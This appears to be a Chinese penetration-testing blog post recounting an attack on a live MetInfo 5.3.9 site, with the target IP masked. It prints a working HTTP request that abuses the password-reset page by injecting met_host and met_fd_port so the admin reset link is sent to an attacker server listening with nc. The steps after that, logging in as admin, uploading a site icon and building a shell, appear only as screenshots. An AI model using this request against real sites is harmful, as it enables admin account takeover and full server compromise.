---
title: MetInfos实战
date: 2019-04-10 23:11:52
tags: [CMS]
categories: [CMS,渗透]
---

发现目标是**MetInfo 5.3.9** ，结合任意账户密码重置登录后台Getshell。

![001](/img/cms/MetInfo/Getshell/1.png)

在忘记密码处抓包，添加met_fd_port和met_host,met_host是服务器ip地址。先别忙发送。

![002](/img/cms/MetInfo/Getshell/2.png)

数据包如下。

```
POST /admin/admin/getpassword.php HTTP/1.1
Host: ***.***.***.***
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://***.***.***.***/admin/admin/getpassword.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 123
Connection: close
Upgrade-Insecure-Requests: 1

action=next2&abt_type=2&admin_mobile=admin&submit=%E4%B8%8B%E4%B8%80%E6%AD%A5&met_fd_port=12345&met_host=***.***.***.***:8080

```



在服务器上用nc监听8080端口后Burp发包。

![3](/img/cms/MetInfo/Getshell/3.png)

发包后服务器能够接收到重置密码的链接。

![004](/img/cms/MetInfo/Getshell/4.png)

使用链接重置密码，登录后台。

![005](/img/cms/MetInfo/Getshell/5.png)

登录后台。

![006](/img/cms/MetInfo/Getshell/6.png)

上传网站图标

![007](/img/cms/MetInfo/Getshell/7.png)

构造exp生成shell。

![008](/img/cms/MetInfo/Getshell/8.png)

